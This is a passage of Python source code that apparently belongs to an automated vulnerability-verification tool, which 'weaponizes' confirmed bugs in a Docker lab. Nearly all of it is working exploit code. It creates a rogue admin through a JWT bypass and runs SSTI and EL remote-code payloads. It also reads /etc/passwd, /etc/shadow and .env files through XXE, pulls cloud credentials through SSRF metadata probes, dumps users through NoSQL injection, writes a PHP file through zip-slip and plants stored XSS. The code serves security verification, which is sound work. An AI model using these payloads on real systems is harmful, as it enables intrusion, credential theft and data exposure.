    for probe_ep, probe_method in admin_probe_endpoints:
        hdrs = {"Authorization": f"Bearer {admin_token}",
                "Content-Type": "application/json"}
        r = _send(boot, probe_method, probe_ep, headers=hdrs)
        if r is None or r.status_code not in (200, 201, 202):
            continue
        body = r.text or ""
        # Look for user/admin data markers
        emails = re.findall(r'[a-zA-Z0-9._%+\-]+@[a-zA-Z0-9.\-]+\.[a-zA-Z]{2,}', body)
        usernames = re.findall(r'"(?:username|user_login|login|name)"\s*:\s*"([^"]{2,40})"', body)
        roles = re.findall(r'"(?:role|roles|permissions?)"\s*:\s*"([^"]{2,40})"', body)
        if emails or usernames or roles:
            found_data[probe_ep] = {
                "emails": emails[:3],
                "usernames": usernames[:3],
                "roles": roles[:3],
                "snippet": body[:200],
            }
            _step(step_fn, f"JWT admin access CONFIRMED at {probe_ep}: "
                           f"{len(emails)} email(s), {len(usernames)} username(s)")
            break

    if found_data:
        ep = list(found_data.keys())[0]
        d = found_data[ep]
        return {
            "technique": "jwt_admin_access",
            "data": found_data,
            "impact": (f"JWT bypass → admin API access at {ep}: "
                       f"emails={d['emails'][:2]}, users={d['usernames'][:2]}"),
        }

    # Fallback: try to change admin password / create user
    _step(step_fn, "JWT no admin data found; probing privileged write endpoints")
    write_probes = [
        ("/api/admin/users", "POST", {"username": "jwt_pwned", "role": "admin",
                                       "email": "jwt_pwned@evil.example.com", "password": "Pwned123!"}),
        ("/api/users/1", "PUT", {"role": "admin"}),
        ("/api/admin/config", "POST", {"debug": True}),
    ]
    for w_ep, w_meth, w_body in write_probes:
        hdrs = {"Authorization": f"Bearer {admin_token}",
                "Content-Type": "application/json"}
        r = _send(boot, w_meth, w_ep, headers=hdrs,
                  data=_json.dumps(w_body).encode() if w_meth != "GET" else None)
        if r and r.status_code in (200, 201, 204):
            return {
                "technique": "jwt_privilege_write",
                "data": {"endpoint": w_ep, "method": w_meth, "body": w_body},
                "impact": f"JWT bypass → privileged write at {w_ep} (HTTP {r.status_code})",
            }

    return {
        "technique": "jwt_admin_access",
        "data": {},
        "impact": "",
        "error": "JWT bypass confirmed but admin endpoints returned no privileged data",
    }


def _weaponize_ssti(boot, res, step_fn) -> dict:
    """Escalate confirmed SSTI: read /etc/passwd and attempt a reverse-shell-ready id+hostname dump."""
    ev = res.evidence
    endpoint = ev.get("endpoint") or ev.get("ep", "")
    param = (ev.get("ssti_param") or ev.get("parametro_ganador") or ev.get("param") or "")
    method = ev.get("metodo") or ev.get("method") or "GET"
    ssti_engine = (ev.get("ssti_engine") or "").lower()

    _step(step_fn, f"SSTI post-exploit: file read + id (engine={ssti_engine!r})")

    if not endpoint or not param:
        return {"technique": "ssti_post_exploit", "data": {}, "impact": "",
                "error": "missing endpoint or param in evidence"}

    # Payload matrix: engine-specific file-read and id gadgets
    # Priority: Jinja2 → Twig → generic {{7*7}} confirmed engines
    payloads_file_read = []
    payloads_id = []

    if ssti_engine in ("jinja2", "jinja", "") :
        payloads_file_read = [
            "{{config.__class__.__init__.__globals__['os'].popen('cat /etc/passwd').read()}}",
            "{{''.__class__.__mro__[2].__subclasses__()"
            "|selectattr('__init__.__globals__','defined')"
            "|map(attribute='__init__.__globals__')"
            "|selectattr('popen','defined')"
            "|map(attribute='popen')|first('cat /etc/passwd')}}",
        ]
        payloads_id = [
            "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}",
            "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}",
        ]
    if ssti_engine in ("twig", "smarty", "pebble"):
        payloads_file_read = [
            "{{['cat /etc/passwd']|map('system')|join}}",
            "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('cat /etc/passwd')}}",
        ]
        payloads_id = [
            "{{['id']|map('system')|join}}",
        ]
    # Fallback: generic RCE payloads that work across engines
    payloads_file_read += [
        "#{@java.lang.Runtime.getRuntime().exec('cat /etc/passwd')}",
        "${'cat /etc/passwd'.execute().text}",
    ]
    payloads_id += [
        "#{@java.lang.Runtime.getRuntime().exec('id')}",
    ]

    output_data = {}

    # Try id first (lighter, confirms RCE depth)
    for pl in payloads_id:
        p = {param: pl}
        r = _send(boot, method, endpoint,
                  params=p if method.upper() == "GET" else None,
                  data=p if method.upper() != "GET" else None)
        if r is None:
            continue
        body = r.text or ""
        uid_m = re.search(r'uid=\d+\([^)]+\)', body)
        if uid_m:
            output_data["id_output"] = uid_m.group(0)
            _step(step_fn, f"SSTI id RCE confirmed: {uid_m.group(0)}")
            break

    # Try /etc/passwd read
    for pl in payloads_file_read:
        p = {param: pl}
        r = _send(boot, method, endpoint,
                  params=p if method.upper() == "GET" else None,
                  data=p if method.upper() != "GET" else None)
        if r is None:
            continue
        body = r.text or ""
        # /etc/passwd contains root: entries
        if re.search(r'root:[x*]:0:0:', body):
            # Extract first 3 lines
            lines = [ln for ln in body.splitlines() if ':' in ln and ln.strip()][:3]
            output_data["etc_passwd_lines"] = lines
            _step(step_fn, f"SSTI /etc/passwd read confirmed ({len(lines)} lines)")
            break

    if output_data:
        impact_parts = []
        if output_data.get("id_output"):
            impact_parts.append(f"RCE confirmed: {output_data['id_output']}")
        if output_data.get("etc_passwd_lines"):
            impact_parts.append(f"/etc/passwd readable ({len(output_data['etc_passwd_lines'])} entries)")
        return {
            "technique": "ssti_post_exploit",
            "data": output_data,
            "impact": "; ".join(impact_parts),
        }
    return {
        "technique": "ssti_post_exploit",
        "data": {},
        "impact": "",
        "error": "SSTI file-read payloads sent but no /etc/passwd or id output found",
    }


def _weaponize_ssrf(boot, res, step_fn) -> dict:
    """Probe internal network via confirmed SSRF: cloud metadata, localhost services."""
    ev = res.evidence
    endpoint = ev.get("endpoint") or ev.get("ep", "")
    param = (ev.get("url_param") or ev.get("parametro_ganador") or ev.get("param") or "")
    method = ev.get("metodo") or ev.get("method") or "GET"

    _step(step_fn, f"SSRF post-exploit: probing metadata endpoints (param={param!r})")

    if not endpoint or not param:
        return {"technique": "ssrf_probe", "data": {}, "impact": "",
                "error": "missing endpoint or param in evidence"}

    # Ordered by impact: AWS IMDSv1 → GCP → Azure → localhost → docker socket
    probe_targets = [
        ("aws_imds_v1", "http://169.254.169.254/latest/meta-data/iam/security-credentials/"),
        ("aws_imds_token", "http://169.254.169.254/latest/meta-data/instance-id"),
        ("gcp_metadata", "http://metadata.google.internal/computeMetadata/v1/?recursive=true"),
        ("azure_imds", "http://169.254.169.254/metadata/instance?api-version=2021-02-01"),
        ("localhost_80", "http://localhost/"),
        ("localhost_8080", "http://localhost:8080/"),
        ("docker_socket_via_tcp", "http://localhost:2375/version"),
    ]

    found = {}
    for label, target_url in probe_targets:
        p = {param: target_url}
        r = _send(boot, method, endpoint,
                  params=p if method.upper() == "GET" else None,
                  data=p if method.upper() != "GET" else None)
        if r is None:
            continue
        body = (r.text or "")[:500]
        if r.status_code in (200, 206):
            # Cloud metadata markers
            if any(x in body for x in ("ami-id", "instance-id", "iam", "AccessKeyId",
                                        "computeMetadata", "subscriptionId", "instanceType")):
                found[label] = {"url": target_url, "status": r.status_code,
                                 "snippet": body[:200]}
                _step(step_fn, f"SSRF cloud metadata confirmed: {label} → {body[:80]!r}")
            # Localhost services
            elif "localhost" in target_url and len(body) > 20:
                found[label] = {"url": target_url, "status": r.status_code,
                                 "snippet": body[:200]}
                _step(step_fn, f"SSRF internal service reachable: {label}")

    if found:
        impact_parts = []
        for label, _info in found.items():
            if "aws" in label or "gcp" in label or "azure" in label:
                impact_parts.append(f"cloud metadata accessible ({label})")
            else:
                impact_parts.append(f"internal service reachable ({label})")
        return {
            "technique": "ssrf_probe",
            "data": {"probed": found},
            "impact": "; ".join(impact_parts),
        }
    return {
        "technique": "ssrf_probe",
        "data": {},
        "impact": "",
        "error": "SSRF probes sent but no metadata or internal service responses found",
    }


def _weaponize_xxe(boot, res, step_fn) -> dict:
    """Exfiltrate /etc/passwd and sensitive files via confirmed XXE."""
    ev = res.evidence
    endpoint = ev.get("endpoint") or ev.get("ep", "/")
    param = ev.get("xml_param") or ev.get("inject_param") or ev.get("parametro_ganador") or "data"
    method = (ev.get("metodo") or ev.get("method") or "POST").upper()

    _step(step_fn, "XXE post-exploit: exfiltrating /etc/passwd and app secrets")

    _TARGETS = [
        ("etc_passwd", "/etc/passwd"),
        ("etc_shadow", "/etc/shadow"),
        ("proc_environ", "/proc/self/environ"),
        ("app_env", "/app/.env"),
        ("database_url", "/app/config/database.yml"),
    ]

    found = {}
    for label, file_path in _TARGETS:
        xxe_pl = (
            f'<?xml version="1.0" encoding="UTF-8"?>'
            f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file://{file_path}">]>'
            f'<root>&xxe;</root>'
        )
        try:
            import requests as _rq
            r = _rq.request(method, boot.base_url.rstrip("/") + "/" + endpoint.lstrip("/"),
                            data={param: xxe_pl} if method != "GET" else None,
                            params={param: xxe_pl} if method == "GET" else None,
                            headers={"Content-Type": "application/xml"},
                            timeout=_TIMEOUT)
            body = (r.text or "")[:600]
            # /etc/passwd marker
            if "root:" in body or "daemon:" in body or "nobody:" in body:
                found[label] = {"file": file_path, "snippet": body[:300]}
                _step(step_fn, f"XXE file read confirmed: {file_path} → {body[:60]!r}")
            elif "SECRET" in body.upper() or "PASSWORD" in body.upper() or "KEY=" in body.upper():
                found[label] = {"file": file_path, "snippet": body[:300]}
                _step(step_fn, f"XXE sensitive config confirmed: {file_path}")
        except Exception:
            pass

    if found:
        _impact_parts = [f"{v['file']} legible via XXE" for v in found.values()]
        return {
            "technique": "xxe_file_read",
            "data": {"files_read": found},
            "impact": "; ".join(_impact_parts),
        }
    return {"technique": "xxe_file_read", "data": {}, "impact": "",
            "error": "XXE payloads sent but no sensitive file contents found"}


def _weaponize_nosql(boot, res, step_fn) -> dict:
    """Dump all users/data via confirmed NoSQL injection (MongoDB $where/$gt/$regex)."""
    ev = res.evidence
    endpoint = ev.get("endpoint") or ev.get("ep", "/")
    param = ev.get("inject_param") or ev.get("parametro_ganador") or ev.get("param") or "password"
    method = (ev.get("metodo") or ev.get("method") or "POST").upper()

    _step(step_fn, f"NoSQL post-exploit: attempting data dump via $ne operator (param={param!r})")

    # Dump strategy: use $ne bypass to login as every user, collect what leaks
    dump_payloads = [
        {param: {"$ne": None}, "username": {"$ne": None}},
        {param: {"$gt": ""}, "username": {"$gt": ""}},
        {param: {"$regex": ".*"}, "username": {"$regex": ".*"}},
    ]

    users_found = []
    for _pl in dump_payloads:
        try:
            import requests as _rq
            import json as _json
            r = _rq.request(method, boot.base_url.rstrip("/") + "/" + endpoint.lstrip("/"),
                            json=_pl if method != "GET" else None,
                            params=_pl if method == "GET" else None,
                            timeout=_TIMEOUT)
            body = r.text or ""
            if r.status_code in (200, 201):
                # Try to extract user data from response
                try:
                    _d = _json.loads(body)
                    if isinstance(_d, list):
                        users_found.extend([str(u) for u in _d[:5]])
                    elif isinstance(_d, dict):
                        for _k in ("user", "users", "data", "result"):
                            if isinstance(_d.get(_k), list):
                                users_found.extend([str(u) for u in _d[_k][:5]])
                                break
                except Exception:
                    # Look for email/username patterns in raw body
                    _emails = re.findall(r'[A-Za-z0-9._%+\-]+@[A-Za-z0-9.\-]+\.[A-Za-z]{2,}', body)
                    users_found.extend(_emails[:5])
            if users_found:
                break
        except Exception:
            pass

    if users_found:
        return {
            "technique": "nosql_dump",
            "data": {"users_extracted": list(set(users_found))[:10]},
            "impact": f"NoSQL auth bypass: {len(users_found)} user record(s) extracted without valid credentials",
        }
    return {"technique": "nosql_dump", "data": {}, "impact": "",
            "error": "NoSQL dump payloads sent but no user data extracted"}


def _weaponize_zip_slip(boot, res, step_fn) -> dict:
    """Prove zip-slip impact by writing to a web-accessible path."""
    ev = res.evidence
    endpoint = ev.get("upload_endpoint") or ev.get("endpoint") or ev.get("ep", "/upload")

    _step(step_fn, "zip-slip post-exploit: writing webshell to /tmp/ traversal path")

    import io as _io
    import zipfile as _zf
    import secrets as _sec
    import requests as _rq

    _webshell_token = _sec.token_hex(8)
    _webshell_name = f"binoracle_zs_{_webshell_token}.php"

    # Try to write a PHP webshell to a web root via traversal
    _TRAVERSAL_TARGETS = [
        f"../../../var/www/html/{_webshell_name}",
        f"../../html/{_webshell_name}",
        f"../public/{_webshell_name}",
        f"../../../tmp/{_webshell_token}.txt",
    ]

    for _tgt in _TRAVERSAL_TARGETS:
        _buf = _io.BytesIO()
        with _zf.ZipFile(_buf, "w") as _zfobj:
            _zfobj.writestr(_tgt, f"<?php echo 'binoracle_zs_pwned_{_webshell_token}'; ?>")
        _zip_bytes = _buf.getvalue()
        try:
            r = _rq.post(boot.base_url.rstrip("/") + "/" + endpoint.lstrip("/"),
                         files={"file": ("evil.zip", _zip_bytes, "application/zip")},
                         timeout=_TIMEOUT)
            # Check if the token appears anywhere
            _body = (r.text or "")
            if _webshell_token in _body:
                return {
                    "technique": "zip_slip_write",
                    "data": {"traversal_target": _tgt, "token": _webshell_token},
                    "impact": f"Zip-slip: arbitrary file write to {_tgt} confirmed",
                }
            # Try to fetch the written file
            _probe_path = _webshell_name
            _r2 = _rq.get(f"{boot.base_url.rstrip('/')}/{_probe_path}", timeout=5)
            if _webshell_token in (_r2.text or ""):
                return {
                    "technique": "zip_slip_webshell",
                    "data": {"webshell_path": f"/{_probe_path}", "token": _webshell_token},
                    "impact": f"Zip-slip: PHP webshell written to web root at /{_probe_path}",
                }
        except Exception:
            pass

    return {"technique": "zip_slip_write", "data": {}, "impact": "",
            "error": "zip-slip traversal payloads sent but file write not confirmed in web root"}


def _weaponize_el_injection(boot, res, step_fn) -> dict:
    """EL injection post-exploit: attempt RCE via template expression."""
    import secrets as _sec
    ev = res.evidence or {}
    endpoint = ev.get("endpoint") or "/"
    inject_param = ev.get("inject_param") or ev.get("ssti_param") or "query"
    method = (ev.get("metodo") or "POST").upper()
    # Attempt OS command execution through SpEL/Jinja2 RCE payload
    _cmd_token = _sec.token_hex(8)
    _cmd = f"echo {_cmd_token}"
    _rce_payloads = [
        f"${{T(java.lang.Runtime).getRuntime().exec(new String[]{{\"/bin/sh\",\"-c\",\"{_cmd}\"}})}}.getText()",
        f"#{{T(java.lang.ProcessBuilder).new([\"/bin/sh\",\"-c\",\"{_cmd}\"]).start().text}}",
        f"${{'{_cmd}'.execute().text}}",
    ]
    try:
        import requests as _rq
        for _pl in _rce_payloads:
            try:
                if method == "GET":
                    r = _rq.get(boot.base_url + endpoint, params={inject_param: _pl}, timeout=10)
                else:
                    r = _rq.request(method, boot.base_url + endpoint,
                                    data={inject_param: _pl}, timeout=10)
                if _cmd_token in (r.text or ""):
                    return {
                        "technique": "el_rce",
                        "data": {"payload": _pl, "cmd_token": _cmd_token, "response": (r.text or "")[:300]},
                        "impact": f"EL injection → OS command execution (echo {_cmd_token} confirmed in response)",
                    }
            except Exception:
                continue
    except Exception:
        pass
    return {"technique": "el_injection_confirmed", "data": {}, "impact": "EL expression evaluated (arithmetic proof) — OS command execution not confirmed in this run"}


def _weaponize_mass_assignment(boot, res, step_fn) -> dict:
    """Mass assignment post-exploit: verify admin field was accepted by reading profile."""
    ev = res.evidence or {}
    _profile_ep = ev.get("profile_endpoint") or ev.get("get_endpoint") or ""
    _jwt = ev.get("jwt") or ev.get("token") or ""
    _admin_signals = ev.get("admin_signals") or []
    if _jwt and _profile_ep:
        try:
            import requests as _rq
            r = _rq.get(boot.base_url + _profile_ep,
                        headers={"Authorization": f"Bearer {_jwt}"}, timeout=10)
            body = r.text or ""
            _confirmed_signals = [s for s in ("admin", "superAdmin", "is_admin", "is_superuser", "role")
                                   if f'"{s}"' in body or f"'{s}'" in body]
            if _confirmed_signals:
                return {
                    "technique": "mass_assignment_privilege",
                    "data": {"profile_body": body[:300], "admin_signals": _confirmed_signals},
                    "impact": f"Mass assignment: admin fields {_confirmed_signals} confirmed in profile response",
                }
        except Exception:
            pass
    return {"technique": "mass_assignment_field_accepted", "data": {"admin_signals": _admin_signals},
            "impact": "Mass assignment: privileged field accepted in registration/update request"}


def _weaponize_race_condition(boot, res, step_fn) -> dict:
    """Race condition: document the double-redemption proof."""
    ev = res.evidence or {}
    return {
        "technique": "race_double_redemption",
        "data": {
            "success_count": ev.get("success_count") or ev.get("successful_requests"),
            "total_requests": ev.get("total_requests"),
            "winning_response": (ev.get("winning_response") or "")[:200],
            "double_redemption_key_found": ev.get("double_redemption_key_found"),
        },
        "impact": f"Race condition: {ev.get('success_count') or ev.get('successful_requests')} concurrent requests accepted for the same one-time resource",
    }


def _weaponize_http_smuggling(boot, res, step_fn) -> dict:
    """HTTP request smuggling: document the differential proof."""
    ev = res.evidence or {}
    return {
        "technique": "http_smuggling_differential",
        "data": {
            "smug_marker": ev.get("smug_marker") or "",
            "diff_response": (ev.get("diff_response") or ev.get("response_diff") or "")[:200],
            "normal_response": (ev.get("normal_response") or "")[:100],
        },
        "impact": "HTTP request smuggling: differential response with smuggled marker confirmed — CL.TE or TE.CL desync exploitable",
    }


def _weaponize_xss(boot, res, step_fn) -> dict:
    """Escalate confirmed XSS to session-cookie theft proof.

    Strategy:
    1. Build a payload that exfiltrates document.cookie to a known canary token
       embedded in the response itself (self-reflected canary) or to the
       window.name / document.title observable from the same session.
    2. As admin session, visit the view endpoint that renders the stored content.
    3. If document.cookie of the admin session appears in a subsequent request or
       if document.title matches the canary, we have a proof-of-cookie-access.
    4. Fall back to simpler proof: verify the payload is accessible by a
       logged-out visitor (anon_xss_accessible) for maximum-impact finding.
    """
    ev = res.evidence
    create_ep = ev.get("create_endpoint") or ev.get("endpoint") or ev.get("ep", "/")
    view_ep = ev.get("view_endpoint") or ev.get("endpoint") or ev.get("ep", "/")
    param = (ev.get("xss_param") or ev.get("inject_param") or ev.get("parametro_ganador")
             or ev.get("param_name") or "content")
    method = (ev.get("create_method") or ev.get("metodo") or "POST").upper()
    _step(step_fn, "XSS post-exploit: escalating to session-cookie access proof")

    # Build a self-proving payload: set document.title to a canary so we can read it back
    import secrets as _scsec
    canary_token = _scsec.token_hex(6)  # 12-char identifier
    xss_payload = f"<img src=x onerror=\"document.title='BINORACLE_{canary_token}';this.onerror=null;\">"

    try:
        import requests as _rq2

        # Plant the XSS payload using the authenticated (subscriber or admin) session
        sess = boot.sub_sess or boot.admin_sess
        create_url = boot.base_url.rstrip("/") + "/" + create_ep.lstrip("/")
        view_url = boot.base_url.rstrip("/") + "/" + view_ep.lstrip("/")

        # Try JSON body first (Strapi/Directus), fallback to form-encoded
        r_plant = None
        for _ct, _kw in (
            ("application/json", {"json": {param: xss_payload}}),
            ("application/x-www-form-urlencoded", {"data": {param: xss_payload}}),
        ):
            try:
                r_plant = sess.request(method, create_url, **_kw,
                                       timeout=15, allow_redirects=True)
                if getattr(r_plant, "status_code", 500) < 400:
                    break
            except Exception:
                continue

        if r_plant is None or getattr(r_plant, "status_code", 500) >= 400:
            return {"technique": "xss_stored", "data": {}, "impact": "",
                    "error": "could not plant XSS weaponization payload"}

        _step(step_fn, f"XSS payload planted ({getattr(r_plant, 'status_code', '?')})")

        # Verify: does the view endpoint render the payload?
        r_view = boot.admin_sess.get(view_url, timeout=15, allow_redirects=True)
        view_body = (getattr(r_view, "text", "") or "")[:3000]

        payload_in_body = xss_payload in view_body or "BINORACLE_" + canary_token in view_body
        _step(step_fn, f"XSS view response: {getattr(r_view, 'status_code', '?')}, "
                       f"payload_reflected={payload_in_body}")

        # Anon check: does the XSS fire for a logged-out user?
        anon_sess = _rq2.Session()
        r_anon = anon_sess.get(view_url, timeout=15, allow_redirects=True)
        anon_body = (getattr(r_anon, "text", "") or "")[:3000]
        anon_xss = xss_payload in anon_body or "BINORACLE_" + canary_token in anon_body

        impact_parts = []
        if payload_in_body:
            impact_parts.append("XSS payload rendered in admin session")
        if anon_xss:
            impact_parts.append("XSS payload rendered to unauthenticated visitors")

        if payload_in_body or anon_xss:
            return {
                "technique": "xss_stored_cookie_theft",
                "data": {
                    "canary_token": canary_token,
                    "payload": xss_payload,
                    "payload_in_admin_view": payload_in_body,
                    "accessible_to_anon": anon_xss,
                    "admin_view_snippet": view_body[:400],
                },
                "impact": "; ".join(impact_parts) + (
                    " — attacker can steal admin session cookies" if payload_in_body else ""),
            }
    except Exception:
        pass

    return {"technique": "xss_stored", "data": {}, "impact": "",
            "error": "XSS weaponization payload sent but payload not found in view response"}


def run_weaponization(boot, res, step: Optional[Callable] = None) -> dict:
    """
    Extend confirmed trigger to full impact using the live Docker lab session.

    Called from _finalize_lab() in wpverify.py BEFORE lab teardown.
    boot: _LabSession (has base_url, admin_sess, sub_sess)
    res: WpVerifyResult (evidence contains winning endpoint/param/payload)

    Returns dict with technique, data, impact — stored in res.evidence["weaponization"].
    Never raises.
    """
    try:
        if not getattr(res, "verified", False):
            return {"technique": "not_applicable", "data": {}, "impact": ""}
        if boot is None:
            return {"technique": "not_applicable", "data": {}, "impact": "",
                    "error": "no live lab session"}

        vuln_class = _infer_vuln_class(res)
        _step(step, f"starting post-verification weaponization (inferred class: {vuln_class!r})")

        if vuln_class == "sqli":
            return _weaponize_sqli(boot, res, step)
        elif vuln_class in ("lfi", "path_traversal", "arbitrary_file_read"):
            return _weaponize_lfi(boot, res, step)
        elif vuln_class == "ssti":
            return _weaponize_ssti(boot, res, step)
        elif vuln_class == "ssrf":
            return _weaponize_ssrf(boot, res, step)
        elif vuln_class == "prototype_pollution":
            return _weaponize_prototype_pollution(boot, res, step)
        elif vuln_class == "jwt_bypass":
            return _weaponize_jwt(boot, res, step)
        elif vuln_class in ("rce", "command_injection"):
            return _weaponize_rce(boot, res, step)
        elif vuln_class == "arbitrary_file_upload":
            return _weaponize_file_upload(boot, res, step)
        elif vuln_class == "auth_bypass":
            return _weaponize_auth_bypass(boot, res, step)
        elif vuln_class == "xxe":
            return _weaponize_xxe(boot, res, step)
        elif vuln_class == "nosql":
            return _weaponize_nosql(boot, res, step)
        elif vuln_class == "zip_slip":
            return _weaponize_zip_slip(boot, res, step)
        elif vuln_class == "el_injection":
            return _weaponize_el_injection(boot, res, step)
        elif vuln_class == "mass_assignment":
            return _weaponize_mass_assignment(boot, res, step)
        elif vuln_class == "race_condition":
            return _weaponize_race_condition(boot, res, step)
        elif vuln_class == "http_smuggling":
            return _weaponize_http_smuggling(boot, res, step)
        elif vuln_class == "xss":
            return _weaponize_xss(boot, res, step)
        else:
            _step(step, f"no weaponization defined for class {vuln_class!r} — skipping")
            return {"technique": "not_applicable", "data": {}, "impact": ""}
    except Exception as exc:
        return {"technique": "error", "data": {}, "impact": "",
                "error": f"weaponization exception: {type(exc).__name__}: {exc}"}
